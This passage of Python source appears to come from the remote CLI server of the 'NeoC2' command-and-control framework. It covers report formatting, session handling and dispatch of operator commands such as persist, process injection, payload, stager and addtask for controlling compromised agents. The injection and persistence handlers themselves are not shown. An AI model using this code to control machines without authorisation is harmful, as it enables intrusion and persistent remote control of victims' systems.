        output = "AUDIT LOG REPORT\n"
        output += "=" * 80 + "\n"
        
        summary = data.get('summary', {}) or {}
        output += f"SUMMARY:\n"
        output += f"  Total Logs:         {summary.get('total_logs', 0)}\n"
        output += f"  Unique Actions:     {summary.get('unique_actions', 0)}\n"
        output += "\n"
        
        actions = data.get('actions', {}) or {}
        if actions:
            output += f"ACTION BREAKDOWN:\n"
            for action, count in list(actions.items())[:10]:  # Top 10 actions
                action_str = str(action)[:30] if action is not None else 'N/A'
                count_val = count if count is not None else 0
                output += f"  {action_str:<30} {count_val:>5}\n"
            if len(actions) > 10:
                output += f"  ... and {len(actions) - 10} more actions\n"
            output += "\n"
        
        logs = data.get('logs', []) or []
        if logs:
            output += f"RECENT LOGS:\n"
            output += f"  {'Timestamp':<20} {'User':<15} {'Action':<15} {'Resource':<15}\n"
            output += f"  {'-'*20} {'-'*15} {'-'*15} {'-'*15}\n"
            
            for log in logs[:10]:  # Show first 10 logs
                if log is not None:
                    timestamp = str(log.get('timestamp', ''))[:19] if log.get('timestamp') else 'N/A'
                    username = str(log.get('user_username', 'N/A'))[:15] if log.get('user_username') else 'N/A'
                    action = str(log.get('action', ''))[:15] if log.get('action') else 'N/A'
                    resource_type = str(log.get('resource_type', 'N/A'))[:10] if log.get('resource_type') else 'N/A'
                    resource_id = str(log.get('resource_id', 'N/A'))[:5] if log.get('resource_id') else 'N/A'
                    resource = f"{resource_type}/{resource_id}"
                    output += f"  {timestamp:<20} {username:<15} {action:<15} {resource:<15}\n"
                else:
                    output += f"  Invalid log entry found\n"
        else:
            output += "  No audit logs found for the specified criteria.\n"
            
        return output, 'success'

    def format_module_usage_report(self, data):
        output = "MODULE USAGE REPORT\n"
        output += "=" * 80 + "\n"
        
        # Summary
        summary = data.get('summary', {}) or {}
        output += f"SUMMARY:\n"
        output += f"  Total Modules:              {summary.get('total_modules', 0)}\n"
        output += f"  Modules with Executions:    {summary.get('modules_with_executions', 0)}\n"
        output += "\n"
        
        modules = data.get('modules', []) or []
        if modules:
            output += f"MODULE USAGE:\n"
            output += f"  {'Name':<20} {'Executions':<10} {'Description'}\n"
            output += f"  {'-'*20} {'-'*10} {'-'*30}\n"
            
            for module in modules[:20]:  # Top 20 modules
                if module is not None:
                    name = str(module.get('module_name', ''))[:20] if module.get('module_name') is not None else ''
                    executions = int(module.get('execution_count', 0)) if module.get('execution_count') is not None else 0
                    desc = str(module.get('module_desc', ''))[:30] if module.get('module_desc') is not None else ''
                    output += f"  {name:<20} {executions:<10} {desc}\n"
                else:
                    output += f"  Invalid module data found\n"
            
            if len(modules) > 20:
                output += f"  ... and {len(modules) - 20} more modules\n"
        else:
            output += "  No modules found for the specified criteria.\n"
            
        return output, 'success'

    def format_system_overview_report(self, data):
        output = "SYSTEM OVERVIEW REPORT\n"
        output += "=" * 80 + "\n"
        
        # System stats
        stats = data.get('system_stats', {}) or {}
        output += f"SYSTEM STATISTICS:\n"
        output += f"  Total Agents:        {stats.get('total_agents', 0)}\n"
        output += f"  Active Agents:       {stats.get('active_agents', 0)}\n"
        output += f"  Inactive Agents:     {stats.get('inactive_agents', 0)}\n"
        output += f"  Total Tasks:         {stats.get('total_tasks', 0)}\n"
        output += f"  Completed Tasks:     {stats.get('completed_tasks', 0)}\n"
        output += f"  Pending Tasks:       {stats.get('pending_tasks', 0)}\n"
        output += f"  Total Modules:       {stats.get('total_modules', 0)}\n"
        output += f"  Total Users:         {stats.get('total_users', 0)}\n"
        output += f"  Total Audit Logs:    {stats.get('total_audit_logs', 0)}\n"
        output += f"  Total Listeners:     {stats.get('total_listeners', 0)}\n"
        output += f"  Generated At:        {data.get('generated_at', datetime.now().isoformat())}\n"
        output += "\n"
        
        recent_agents = data.get('recent_agents', []) or []
        if recent_agents:
            output += f"RECENT AGENTS:\n"
            output += f"  {'ID':<12} {'IP Address':<15} {'Hostname':<20} {'User':<15}\n"
            output += f"  {'-'*12} {'-'*15} {'-'*20} {'-'*15}\n"
            for agent in recent_agents[:5]:  # Top 5
                if agent is not None:
                    agent_id = str(agent.get('id', ''))[:10] if agent.get('id') is not None else ''
                    ip_address = str(agent.get('ip_address', ''))[:15] if agent.get('ip_address') is not None else ''
                    hostname = str(agent.get('hostname', ''))[:20] if agent.get('hostname') is not None else ''
                    user = str(agent.get('user', ''))[:15] if agent.get('user') is not None else ''
                    output += f"  {agent_id:<12} {ip_address:<15} {hostname:<20} {user:<15}\n"
                else:
                    output += f"  Invalid agent data found\n"
        output += "\n"
        
        recent_tasks = data.get('recent_tasks', []) or []
        if recent_tasks:
            output += f"RECENT TASKS:\n"
            output += f"  {'ID':<10} {'Agent ID':<12} {'Status':<12} {'Command'}\n"
            output += f"  {'-'*10} {'-'*12} {'-'*12} {'-'*20}\n"
            for task in recent_tasks[:5]:  # Top 5
                if task is not None:
                    task_id = str(task.get('id', ''))[:10] if task.get('id') is not None else ''
                    agent_id = str(task.get('agent_id', ''))[:12] if task.get('agent_id') is not None else ''
                    status = str(task.get('status', ''))[:12] if task.get('status') is not None else ''
                    command = str(task.get('command', ''))[:20] if task.get('command') else 'N/A'
                    output += f"  {task_id:<10} {agent_id:<12} {status:<12} {command}\n"
                else:
                    output += f"  Invalid task data found\n"
        
        return output, 'success'

    def format_report_export(self, data, report_type, format_type):
        if format_type.lower() == 'csv':
            if report_type == 'agent_activity':
                result, status = self.export_agent_activity_csv(data)
                return result, status
            elif report_type == 'task_execution':
                result, status = self.export_task_execution_csv(data)
                return result, status
            elif report_type == 'audit_log':
                result, status = self.export_audit_log_csv(data)
                return result, status
            elif report_type == 'module_usage':
                result, status = self.export_module_usage_csv(data)
                return result, status
            elif report_type == 'system_overview':
                return f"System overview report (CSV format): \n{str(data)}", 'success'
        elif format_type.lower() == 'json':
            import json
            json_data = {
                'report_type': report_type,
                'generated_at': datetime.now().isoformat(),
                'data': data
            }
            return f"JSON REPORT DATA:\n{json.dumps(json_data, indent=2, default=str)}", 'success'
        else:
            return f"Invalid export format: {format_type}. Use 'csv' or 'json'.", 'error'

    def export_agent_activity_csv(self, data):
        output = "ID,IP Address,Hostname,OS Info,User,Status,First Seen,Last Seen,Task Count,Result Count\n"
        
        agents = data.get('agents', []) or []
        for agent in agents:
            if agent is not None:
                agent_id = agent.get('id', '') if agent else ''
                ip_address = agent.get('ip_address', '') if agent else ''
                hostname = agent.get('hostname', '') if agent else ''
                os_info = agent.get('os_info', '') if agent else ''
                user = agent.get('user', '') if agent else ''
                status = agent.get('status', '') if agent else ''
                first_seen = agent.get('first_seen', '') if agent else ''
                last_seen = agent.get('last_seen', '') if agent else ''
                task_count = agent.get('task_count', 0) if agent else 0
                result_count = agent.get('result_count', 0) if agent else 0
                output += f"{agent_id},{ip_address},{hostname},{os_info},{user},{status},{first_seen},{last_seen},{task_count},{result_count}\n"
        
        return f"Agent Activity Report (CSV):\n{output}", 'success'

    def export_task_execution_csv(self, data):
        output = "Task ID,Agent ID,Agent Hostname,Agent IP,Command,Status,Created At,Completed At,Module ID\n"
        
        tasks = data.get('tasks', []) or []
        for task in tasks:
            if task is not None:
                task_id = task.get('id', '') if task else ''
                agent_id = task.get('agent_id', '') if task else ''
                agent_hostname = task.get('agent_hostname', '') if task else ''
                agent_ip = task.get('agent_ip', '') if task else ''
                command = task.get('command', '') if task else ''
                status = task.get('status', '') if task else ''
                created_at = task.get('created_at', '') if task else ''
                completed_at = task.get('completed_at', '') if task else ''
                module_id = task.get('module_id', '') if task else ''
                output += f"{task_id},{agent_id},{agent_hostname},{agent_ip},{command},{status},{created_at},{completed_at},{module_id}\n"
        
        return f"Task Execution Report (CSV):\n{output}", 'success'

    def export_audit_log_csv(self, data):
        output = "Log ID,User ID,Username,Action,Resource Type,Resource ID,Details,IP Address,Timestamp\n"
        
        logs = data.get('logs', []) or []
        for log in logs:
            if log is not None:
                log_id = log.get('id', '') if log else ''
                user_id = log.get('user_id', '') if log else ''
                user_username = log.get('user_username', '') if log else ''
                action = log.get('action', '') if log else ''
                resource_type = log.get('resource_type', '') if log else ''
                resource_id = log.get('resource_id', '') if log else ''
                details = log.get('details', '') if log else ''
                ip_address = log.get('ip_address', '') if log else ''
                timestamp = log.get('timestamp', '') if log else ''
                output += f"{log_id},{user_id},{user_username},{action},{resource_type},{resource_id},{details},{ip_address},{timestamp}\n"
        
        return f"Audit Log Report (CSV):\n{output}", 'success'

    def export_module_usage_csv(self, data):
        output = "Module ID,Module Name,Description,Execution Count\n"
        
        modules = data.get('modules', []) or []
        for module in modules:
            if module is not None:
                module_id = module.get('module_id', '') if module else ''
                module_name = module.get('module_name', '') if module else ''
                module_desc = module.get('module_desc', '') if module else ''
                execution_count = module.get('execution_count', 0) if module else 0
                output += f"{module_id},{module_name},{module_desc},{execution_count}\n"
        
        return f"Module Usage Report (CSV):\n{output}", 'success'

    def handle_neoc2_command(self, command, session):
        command_parts = command.strip().split()
        if not command_parts:
            return "No command provided", 'error'
        
        base_command = command_parts[0].lower()
        
        if hasattr(session, 'interactive_mode') and session.interactive_mode and session.current_agent:
            if self._is_framework_command(base_command):
                if base_command == 'listener':
                    listener_manager = self.listener_manager or session.agent_manager.listener_manager if session.agent_manager else None
                    if not listener_manager:
                        return "Error: Listener manager not initialized", 'error'
                    else:
                        return self.handle_listener_command(command_parts, listener_manager)
                elif base_command == 'modules':
                    return self.handle_modules_command(command_parts, session)
                elif base_command == 'run':
                    return self.handle_run_command(command_parts, session)
                elif base_command == 'pwsh':
                    return self.handle_pwsh_command(command_parts, session)
                elif base_command == 'persist':
                    return self.handle_persist_command(command_parts, session)
                elif base_command == 'pinject':
                    return self.handle_pinject_command(command_parts, session)
                elif base_command == 'peinject':
                    return self.handle_peinject_command(command_parts, session)
                elif base_command == 'agent':
                    return self.handle_agent_command(command_parts, session)
                elif base_command == 'encryption':
                    return self.handle_encryption_command(command_parts, session)
                elif base_command == 'download':
                    return self.handle_download_command(command_parts, session)
                elif base_command == 'upload':
                    return self.handle_upload_command(command_parts, session)
                elif base_command == 'stager':
                    return handle_interactive_stager_command(command_parts, session)
                elif base_command == 'profile':
                    return self.handle_profile_command(command_parts, session)
                elif base_command == 'interactive':
                    if session.interactive_mode and session.current_agent:
                        return self.handle_interactive_command(' '.join(command_parts[1:]), session)
                    else:
                        return 'Not in interactive mode. Use: agent interact <agent_id>', 'error'
                elif base_command == 'help':
                    result = help.get_help_display()
                    return result, 'success'
                elif base_command == 'status':
                    stats = self.agent_manager.get_agent_stats()
                    output = f"""
Framework Status:
Total Agents:      {stats['total_agents']}
Active Agents:     {stats['active_agents']}
Total Tasks:       {stats['total_tasks']}
Pending Tasks:     {stats['pending_tasks']}
DB Total Agents:   {stats['db_total_agents']}
DB Active Agents:  {stats['db_active_agents']}
DB Inactive:       {stats['db_inactive_agents']}
                    """
                    return output.strip(), 'success'
                elif base_command == 'task':
                    if len(command_parts) < 2:
                        return "Usage: task <agent_id> pending tasks would be shown here", 'info'
                    else:
                        agent_id = command_parts[1]
                        tasks = self.db.execute('''
                            SELECT id, command, status, created_at, task_type
                            FROM agent_tasks
                            WHERE agent_id = ? AND status IN ('pending', 'sent')
                            ORDER BY created_at ASC
                        ''', (agent_id,)).fetchall()

                        if not tasks:
                            return f"No pending tasks for agent {agent_id}", 'info'
                        else:
                            output = f"Pending Tasks for Agent {agent_id}:\n"
                            output += "-" * 80 + "\n"
                            for task in tasks:
                                output += f"Task ID: {task['id']}\n"
                                output += f"Command: {task['command'][:20]}{'...' if len(task['command']) > 20 else ''}\n"
                                output += f"Status: {task['status']} ({task['task_type']})\n"
                                output += f"Created: {task['created_at']}\n"
                                output += "-" * 80 + "\n"
                            return output, 'success'
                elif base_command == 'result':
                    if len(command_parts) < 2:
                        return "Usage: result <agent_id> OR result list OR result <task_id>", 'error'
                    elif command_parts[1] == 'list':
                        limit = int(command_parts[2]) if len(command_parts) > 2 else 50
                        results = self.agent_manager.get_all_results(limit)

                        if not results:
                            return "No results found", 'info'
                        else:
                            output = f"Recent Task Results (Last {limit}):\n"
                            output += "-" * 80 + "\n"
                            for res in results:
                                output += f"Task ID:      {res['task_id']}\n"
                                output += f"Agent:        {res['agent_id']} ({res['hostname']}@{res['user']})\n"
                                output += f"Command:      {res['command'][:20]}{'...' if len(res['command']) > 20 else ''}\n"
                                output += f"Type:         {res['task_type']}\n"
                                output += f"Completed:    {res['completed_at']}\n"
                                output += f"Result:       {res['result'][:100]}{'...' if len(res['result']) > 100 else ''}\n"
                                output += "-" * 80 + "\n"
                            return output, 'success'
                    elif len(command_parts) == 2:
                        task_id = command_parts[1]

                        if not task_id.replace('-', '').replace('_', '').isalnum():
                            return f"Invalid task ID format: {task_id}", 'error'
                        else:
                            try:
                                task = self.db.execute('''
                                    SELECT
                                        t.*,
                                        a.hostname,
                                        a.ip_address,
                                        a.os_info,
                                        a.user
                                    FROM agent_tasks t
                                    LEFT JOIN agents a ON t.agent_id = a.id
                                    WHERE t.id = ?
                                ''', (task_id,)).fetchone()

                                if not task:
                                    return f"Task with ID {task_id} not found", 'error'
                                else:
                                    task_dict = dict(task)
                                    task_result = task_dict.get('result', 'No result available')

                                    # Return the complete result without truncation
                                    output = f"Task Details:\n"
                                    output += "-" * 80 + "\n"
                                    output += f"Task ID:      {task_dict['id']}\n"
                                    output += f"Agent ID:     {task_dict['agent_id']}\n"
                                    output += f"Hostname:     {task_dict.get('hostname', 'N/A')} ({task_dict.get('user', 'N/A')})\n"
                                    output += f"IP Address:   {task_dict.get('ip_address', 'N/A')}\n"
                                    output += f"Command:      {task_dict['command'][:20]}{'...' if len(task_dict['command']) > 20 else ''}\n"
                                    output += f"Status:       {task_dict['status']}\n"
                                    output += f"Task Type:    {task_dict.get('task_type', 'queued')}\n"
                                    output += f"Created:      {task_dict['created_at']}\n"
                                    output += f"Completed:    {task_dict['completed_at'] if task_dict['completed_at'] else 'N/A'}\n"
                                    output += "-" * 80 + "\n"
                                    output += f"Complete Result:\n{task_result}\n"
                                    output += "-" * 80 + "\n"

                                    return output, 'success'
                            except Exception as e:
                                return f"Error retrieving task result: {str(e)}", 'error'
                    else:
                        agent_id = command_parts[1]
                        limit = int(command_parts[2]) if len(command_parts) > 2 else 50
                        results = self.agent_manager.get_agent_results(agent_id, limit)

                        if not results:
                            return f"No results found for agent {agent_id}", 'info'
                        else:
                            output = f"Results for Agent {agent_id}:\n"
                            output += "-" * 80 + "\n"
                            for res in results:
                                output += f"Task ID:      {res['task_id']}\n"
                                output += f"Command:      {res['command']}\n"
                                output += f"Created:      {res['created_at']}\n"
                                output += f"Completed:    {res['completed_at']}\n"
                                output += f"Result:       {res['result'][:100]}{'...' if len(res['result']) > 100 else ''}\n"
                                output += "-" * 80 + "\n"
                            return output, 'success'
                elif base_command == 'addtask':
                    # Handle addtask command
                    if len(command_parts) < 3:
                        return "Usage: addtask <agent_id> <command>", 'error'
                    else:
                        agent_id = command_parts[1]
                        
                        if session.agent_manager.is_agent_locked_interactively(agent_id):
                            lock_info = session.agent_manager.get_interactive_lock_info(agent_id)
                            if lock_info and lock_info['operator'] != session.username:
                                return f"Agent {agent_id} is currently in exclusive interactive mode with operator: {lock_info['operator']}. Access denied.", 'error'
                        
                        command_to_send = ' '.join(command_parts[2:])

                        task_result = self.agent_manager.add_task(agent_id, command_to_send)
                        if task_result and task_result.get('success'):
                            task_id = task_result['task_id']
                            result = f"[+] Task created successfully!\n    Task ID:  {task_id}\n    Agent:    {agent_id}\n    Command:  {command_to_send[:60]}{'...' if len(command_to_send) > 60 else ''}"
                            return result, 'success'
                        else:
                            error_msg = task_result.get('error', 'Unknown error') if task_result else 'Failed to create task'
                            result = f"Failed to create task: {error_msg}"
                            return result, 'error'
                elif base_command == 'save':
                    if len(command_parts) < 2:
                        return "Usage: save <task_id>", 'error'

                    task_id = command_parts[1]

                    try:
                        task_result = self.db.execute('''
                            SELECT t.*, a.hostname, a.ip_address, a.os_info, a.user
                            FROM agent_tasks t
                            LEFT JOIN agents a ON t.agent_id = a.id
                            WHERE t.id = ?
                        ''', (task_id,)).fetchone()

                        if not task_result:
                            return f"Task with ID {task_id} not found", 'error'

                        task_dict = dict(task_result)
                        task_result_data = task_dict.get('result', 'No result available')

                        logs_dir = 'logs'
                        os.makedirs(logs_dir, exist_ok=True)

                        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                        filename = f"task_{task_id}_{timestamp}.txt"
                        filepath = os.path.join(logs_dir, filename)

                        content = f"NeoC2 Task Result Export\n"
                        content += f"{'='*50}\n"
                        content += f"Task ID:        {task_dict['id']}\n"
                        content += f"Agent ID:       {task_dict['agent_id']}\n"
                        content += f"Hostname:       {task_dict.get('hostname', 'N/A')}\n"
                        content += f"IP Address:     {task_dict.get('ip_address', 'N/A')}\n"
                        content += f"OS:             {task_dict.get('os_info', 'N/A')}\n"
                        content += f"User:           {task_dict.get('user', 'N/A')}\n"
                        content += f"Command:        {task_dict['command']}\n"
                        content += f"Status:         {task_dict['status']}\n"
                        content += f"Task Type:      {task_dict.get('task_type', 'queued')}\n"
                        content += f"Created:        {task_dict['created_at']}\n"
                        content += f"Completed:      {task_dict['completed_at'] if task_dict['completed_at'] else 'N/A'}\n"
                        content += f"{'='*50}\n"
                        content += f"TASK RESULT:\n"
                        content += f"{task_result_data}\n"
                        content += f"{'='*50}\n"
                        content += f"Exported:       {datetime.now().isoformat()}\n"

                        with open(filepath, 'w', encoding='utf-8') as f:
                            f.write(content)

                        return f"Task result saved to: {filepath}", 'success'

                    except Exception as e:
                        return f"Error saving task result: {str(e)}", 'error'
                elif base_command == 'back':
                    if hasattr(session, 'interactive_mode') and session.interactive_mode and session.current_agent:
                        agent_manager = session.agent_manager
                        if agent_manager:
                            agent_manager.exit_interactive_mode(session.current_agent)
                            agent_id = session.current_agent
                            session.current_agent = None
                            session.interactive_mode = False
                            for sess_id, sess_info in self.active_sessions.items():
                                if sess_info.get('session_id') == getattr(session, 'session_id', None):
                                    sess_info['current_agent'] = None
                                    sess_info['interactive_mode'] = False
                                    break
                        return f"\nExited interactive mode with agent {agent_id}\n", 'success'
                    else:
                        return "Not in interactive mode", 'info'
                elif base_command == 'exit':
                    if hasattr(session, 'interactive_mode') and session.interactive_mode and session.current_agent:
                        agent_manager = session.agent_manager
                        if agent_manager:
                            agent_manager.exit_interactive_mode(session.current_agent)
                            agent_id = session.current_agent
                            session.current_agent = None
                            session.interactive_mode = False
                            for sess_id, sess_info in self.active_sessions.items():
                                if sess_info.get('session_id') == getattr(session, 'session_id', None):
                                    sess_info['current_agent'] = None
                                    sess_info['interactive_mode'] = False
                                    break
                        return f"\nExited interactive mode with agent {agent_id}\n", 'success'
                    else:
                        return "Use the web interface to exit", 'info'
                elif base_command == 'clear':
                    return 'Clear command only works in local CLI', 'info'
                elif base_command == 'payload':
                    return self.handle_payload_command(command_parts, session)
                elif base_command == 'inline-execute':
                    return self.handle_inline_execute_command(command_parts, session)
                elif base_command == 'inline-execute-assembly':
                    return self.handle_inline_execute_assembly_command(command_parts, session)
                elif base_command == 'interact':
                    # Handle the interact command (alias for agent interact)
                    if len(command_parts) < 2:
                        return "Usage: interact <agent_id>", 'error'
                    else:
                        agent_command_parts = ['agent', 'interact'] + command_parts[1:]
                        return self.handle_agent_command(agent_command_parts, session)
                elif base_command == 'event':
                    if not self.audit_logger:
                        return "Audit logger not available", 'error'
                    else:
                        action = 'list'  # default action
                        limit = 50  # default limit
                        offset = 0  # default offset
                        search_query = ''

                        if len(command_parts) > 1:
                            action = command_parts[1].lower()

                        for i, part in enumerate(command_parts[2:], 2):
                            if '=' in part:
                                key, value = part.split('=', 1)
                                if key == 'limit':
                                    try:
                                        limit = int(value)
                                    except ValueError:
                                        limit = 50
                                elif key == 'offset':
                                    try:
                                        offset = int(value)
                                    except ValueError:
                                        offset = 0
                            elif action == 'search' and i == 2:  # First non-flag argument after search is the query
                                search_query = part

                        try:
                            if action == 'list':
                                logs = self.audit_logger.get_logs(limit=limit, offset=offset)
                                if logs:
                                    output = f"Audit Events (limit: {limit}):\n"
                                    output += "-" * 150 + "\n"
                                    output += f"{'Timestamp':<25} {'Username':<20} {'Action':<20} {'Resource':<30} {'Details':<40}\n"
                                    output += "-" * 150 + "\n"
                                    for log in logs:
                                        timestamp = log['timestamp'][:19] if log['timestamp'] else 'N/A'
                                        username = log['username']
                                        action = log['action']
                                        resource = f"{log['resource_type']}/{log['resource_id']}"
                                        details = log['details'][:39] if log['details'] else 'N/A'

                                        # Truncate fields if too long
                                        if len(username) > 19:
                                            username = username[:17] + ".."
                                        if len(action) > 19:
                                            action = action[:17] + ".."
                                        if len(resource) > 29:
                                            resource = resource[:27] + ".."

                                        output += f"{timestamp:<25} {username:<20} {action:<20} {resource:<30} {details:<40}\n"
                                    return output, 'success'
                                else:
                                    return "No audit events found", 'info'
                            elif action == 'search':
                                if not search_query:
                                    return "Usage: event search <query>", 'error'
                                else:
                                    logs = self.audit_logger.search_logs(query=search_query, limit=limit, offset=offset)
                                    if logs:
                                        output = f"Search Results for '{search_query}' (limit: {limit}):\n"
                                        output += "-" * 100 + "\n"
                                        for log in logs:
                                            output += f"[{log['timestamp']}] {log['username']} | {log['action']} | {log['resource_type']}/{log['resource_id']}\n"
                                            output += f"  Details: {log['details']}\n"
                                            output += "-" * 100 + "\n"
                                        return output, 'success'
                                    else:
                                        return f"No events found for search query: {search_query}", 'info'
                            elif action == 'stats':
                                stats = self.audit_logger.get_log_stats()
                                output = f"Audit Log Statistics:\n"
                                output += "-" * 50 + "\n"
                                output += f"Total Logs: {stats.get('total_logs', 0)}\n"
                                output += f"Recent (24h): {stats.get('recent_24h', 0)}\n"
                                output += f"Actions:\n"
                                for action_name, count in list(stats.get('by_action', {}).items())[:10]:  # Show top 10
                                    output += f"  {action_name}: {count}\n"
                                return output, 'success'
                            elif action in ['monitor', 'stop_monitor']:
                                # For real-time monitoring, we need to update session state
                                # This is more complex and requires the session_id from the calling context
                                # But we'll provide informative messages for now
                                if action == 'monitor':
                                    return "Real-time event monitoring: Use 'event' message type for live events. For command line, you can use 'event list' to get current events.", 'info'
                                else:
                                    return "Real-time event monitoring disabled.", 'info'
                            else:
                                return f"Unknown event action: {action}. Use: list, search, stats, monitor, stop_monitor", 'error'
                        except Exception as e:
                            return f"Error retrieving events: {str(e)}", 'error'
                else:
                    return f"Unknown framework command: {base_command}", 'error'
            else:
                return self.handle_interactive_command(command, session)
        
        if base_command == 'listener':
            return self.handle_listener_command(command_parts)
        elif base_command == 'modules':
            return self.handle_modules_command(command_parts, session)
        elif base_command == 'run':
            return self.handle_run_command(command_parts, session)
        elif base_command == 'pwsh':
            return self.handle_pwsh_command(command_parts, session)
        elif base_command == 'persist':
            return self.handle_persist_command(command_parts, session)
        elif base_command == 'pinject':
            return self.handle_pinject_command(command_parts, session)
        elif base_command == 'peinject':
            return self.handle_peinject_command(command_parts, session)
        elif base_command == 'agent':
            return self.handle_agent_command(command_parts, session)
        elif base_command == 'encryption':
            return self.handle_encryption_command(command_parts, session)
        elif base_command == 'stager':
            return handle_interactive_stager_command(command_parts, session)
        elif base_command == 'download':
            return self.handle_download_command(command_parts, session)
        elif base_command == 'upload':
            return self.handle_upload_command(command_parts, session)
        elif base_command == 'payload':
            return self.handle_payload_command(command_parts, session)
        elif base_command == 'inline-execute':
            return self.handle_inline_execute_command(command_parts, session)
        elif base_command == 'inline-execute-assembly':
            return self.handle_inline_execute_assembly_command(command_parts, session)
        elif base_command == 'interact':
            if len(command_parts) < 2:
                return "Usage: interact <agent_id>", 'error'
            agent_command_parts = ['agent', 'interact'] + command_parts[1:]
            return self.handle_agent_command(agent_command_parts, session)
        elif base_command == 'help':
            return help.get_help_display(), 'success'
        elif base_command == 'back':
            if hasattr(session, 'interactive_mode') and session.interactive_mode and session.current_agent:
                agent_manager = session.agent_manager
                if agent_manager:
                    agent_manager.exit_interactive_mode(session.current_agent)
                    agent_id = session.current_agent
                    session.current_agent = None
                    session.interactive_mode = False
                    for sess_id, sess_info in self.active_sessions.items():
                        if sess_info.get('session_id') == getattr(session, 'session_id', None):
                            sess_info['current_agent'] = None
                            sess_info['interactive_mode'] = False
                            break
                return f"\nExited interactive mode with agent {agent_id}\n", 'success'
            else:
                return "Not in interactive mode", 'info'
        elif base_command == 'exit':
            if hasattr(session, 'interactive_mode') and session.interactive_mode and session.current_agent:
                agent_manager = session.agent_manager
                if agent_manager:
                    agent_manager.exit_interactive_mode(session.current_agent)
                    agent_id = session.current_agent
                    session.current_agent = None
                    session.interactive_mode = False
                    for sess_id, sess_info in self.active_sessions.items():
                        if sess_info.get('session_id') == getattr(session, 'session_id', None):
                            sess_info['current_agent'] = None
                            sess_info['interactive_mode'] = False
                            break
                return f"\nExited interactive mode with agent {agent_id}\n", 'success'
            else:
                return "Use the web interface to exit", 'info'
        else:
            return f"Unknown command: {base_command}. Type 'help' or use CLI for full functionality.", 'error'

    def get_prompt(self, session):
        if hasattr(session, 'interactive_mode') and session.interactive_mode and session.current_agent:
            agent_id_short = session.current_agent[:8] if session.current_agent else 'unknown'
            return f"NeoC2 [INTERACTIVE:{agent_id_short}] > "
        elif session.current_agent:
            agent_id_short = session.current_agent[:8] if session.current_agent else 'unknown'
            return f"NeoC2 ({agent_id_short}) > "
        elif hasattr(session, 'current_target') and session.current_target:
            return f"NeoC2 ({session.current_target}) > "
        else:
            return "NeoC2 > "
        
    def start(self):
        if self.running:
            return True
            
        try:
            self.logger.info(f"Starting Remote CLI Server on {self.host}:{self.port}")
            
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            
            self.running = True
            
            server_thread = threading.Thread(target=self._accept_connections)
            server_thread.daemon = True
            server_thread.start()
            
            self.logger.info(f"Remote CLI Server started successfully on {self.host}:{self.port}")
            self.logger.info(f"SSL Enabled: {self.ssl_enabled}")
            
            if self.audit_logger:
                audit_monitor_thread = threading.Thread(target=self._audit_event_monitor)
                audit_monitor_thread.daemon = True
                audit_monitor_thread.start()
                self.logger.info("Audit event monitoring started for remote CLI clients")
            
            return True
            
        except Exception as e:
            self.logger.error(f"Error starting Remote CLI server: {str(e)}")
            return False

    def stop(self):
        if not self.running:
            return True

        try:
            self.logger.info("Stopping Remote CLI Server...")
            self.running = False

            if self.server_socket:
                self.server_socket.close()
                self.server_socket = None

            for session_id in list(self.active_sessions.keys()):
                self._close_session(session_id)

            # Stop the agent broadcast thread
            self._stop_agent_broadcast_thread()

            self.logger.info("Remote CLI Server stopped successfully")
            return True

        except Exception as e:
            self.logger.error(f"Error stopping Remote CLI server: {str(e)}")
            return False

    def _accept_connections(self):
        """Accept incoming client connections"""
        while self.running:
            try:
                client_socket, addr = self.server_socket.accept()
                self.logger.info(f"New remote CLI connection from {addr}")
                
                client_thread = threading.Thread(
                    target=self._handle_client_connection,
                    args=(client_socket, addr)
                )
                client_thread.daemon = True
                client_thread.start()
                
            except Exception as e:
                if self.running:  # Only log error if we weren't intentionally stopping
                    self.logger.error(f"Error accepting client connection: {str(e)}")
                time.sleep(0.1)  # Prevent tight loop on error

    def _handle_client_connection(self, client_socket, addr):
        session_id = str(uuid.uuid4())
        ssl_socket = None
        
        try:
            if self.ssl_enabled and self._ssl_files_exist():
                try:
                    ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
                    ssl_context.load_cert_chain(certfile=self.cert_file, keyfile=self.key_file)
                    ssl_socket = ssl_context.wrap_socket(client_socket, server_side=True)
                    self.logger.info(f"SSL connection established with {addr}")
                except Exception as e:
                    self.logger.error(f"SSL setup failed for {addr}: {str(e)}")
                    client_socket.close()
                    return
            else:
                ssl_socket = client_socket
            
            ssl_socket.settimeout(300)  # 5 minute timeout
            
            self.logger.info(f"Client {addr} connected with session {session_id[:8]}...")
            
            self.active_sessions[session_id] = {
                'socket': ssl_socket,
                'addr': addr,
                'connected_at': datetime.now(),
                'last_activity': datetime.now(),
                'user_id': None,
                'username': None,
                'authenticated': False,
                'current_agent': None,
                'interactive_mode': False
            }
            
            while self.running and session_id in self.active_sessions:
                try:
                    message = self._receive_data(ssl_socket)
                    if not message:
                        break
                        
                    self.active_sessions[session_id]['last_activity'] = datetime.now()
                    
                    response = self._process_message(message, session_id)
                    
                    if response:
                        self._send_data(ssl_socket, response)
                        
                    if message.get('type') == 'disconnect':
                        break
                        
                except socket.timeout:
                    session_info = self.active_sessions.get(session_id)
                    if session_info:
                        inactive_time = datetime.now() - session_info['last_activity']
                        if inactive_time.total_seconds() > 300:  # 5 minutes
                            self.logger.info(f"Session {session_id[:8]}... timed out due to inactivity")
                            break
                    continue
                except Exception as e:
                    self.logger.info(f"Error processing message from {addr}: {str(e)}")
                    break
            
        except Exception as e:
            self.logger.error(f"Error handling client connection {addr}: {str(e)}")
        finally:
            # Clean up the session
            self._close_session(session_id)
            if ssl_socket and ssl_socket != client_socket:
                ssl_socket.close()
            elif client_socket:
                client_socket.close()

    def _process_message(self, message, session_id):
        msg_type = message.get('type', 'unknown')
        
        if msg_type == 'auth':
            return self._handle_auth(message, session_id)
        elif msg_type == 'command':
            return self._handle_command(message, session_id)
        elif msg_type == 'event':
            return self._handle_event_command(message, session_id)
        elif msg_type == 'disconnect':
            return {'success': True, 'message': 'Disconnected'}
        else:
            return {'success': False, 'error': f'Unknown message type: {msg_type}'}

    def _handle_auth(self, message, session_id):
        try:
            username = message.get('username')
            password = message.get('password')
            
            if not username or not password:
                return {'success': False, 'error': 'Username and password required'}
            
            user_info = self.user_manager.authenticate(username, password)
            
            if user_info:
                token = str(uuid.uuid4())
                
                # Update session info
                session_info = self.active_sessions[session_id]
                session_info.update({
